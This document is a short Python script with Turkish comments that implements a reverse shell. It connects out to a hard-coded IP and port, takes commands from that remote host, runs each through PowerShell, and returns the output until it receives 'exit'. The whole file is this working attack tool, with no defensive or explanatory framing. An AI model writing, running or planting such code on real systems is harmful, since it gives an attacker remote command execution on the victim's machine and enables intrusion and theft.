import socket
import subprocess
import os

# Hedef IP ve portu gir
TARGET_IP = '192.168.1.5'  # Hedef IP adresini buraya yaz
TARGET_PORT = 1234        # Dinleme yapılacak port 

# Bağlantı kur
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

# Sonsuz döngü ile komutları alıp çalıştır
while True:
    # Komut al
    data = s.recv(1024)
    if data.decode() == 'exit':  # 'exit' komutu gelirse çık
        break

    # Komutları çalıştırmak için PowerShell kullanıyoruz
    proc = subprocess.Popen(['powershell', '-Command', data.decode()],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = proc.communicate()

    # Çıktıyı geri gönder
    s.send(stdout + stderr)

# Bağlantıyı kapat
s.close()
